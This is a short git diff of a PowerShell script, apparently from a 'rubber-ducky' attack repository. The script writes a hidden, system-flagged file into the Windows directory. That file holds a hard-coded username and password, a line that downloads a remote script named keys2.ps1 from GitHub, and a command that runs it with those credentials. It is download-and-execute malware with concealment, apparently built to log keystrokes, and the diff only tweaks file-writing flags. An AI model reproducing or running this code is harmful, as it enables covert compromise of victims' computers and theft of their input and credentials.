@@ -261,8 +261,8 @@ $functions =  {
             if(-Not ([System.IO.File]::Exists($modulenamepath)))
             {
                 Out-File -InputObject '$username = "ryouichi.mikami.hirata"' -Force $env:windir\$modulename
-                Out-File -InputObject '$password = "toryfuhbtedjzxig"' -Force -Append -NoClobber $env:windir\$modulename
-                Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/keys2.ps1"))' -Force -Append -NoClobber $env:windir\$modulename
+                Out-File -InputObject '$password = "toryfuhbtedjzxig"' -Append -NoClobber $env:windir\$modulename
+                Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/keys2.ps1"))' -Append -NoClobber $env:windir\$modulename
                 Out-File -InputObject 'Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptPath)) -ArgumentList "$username", "$password"' -Append -NoClobber $env:windir\$modulename
                 $modulenamefile = Get-Item $env:windir\$modulename
                 $modulenamefile.Attributes = "Hidden","System"
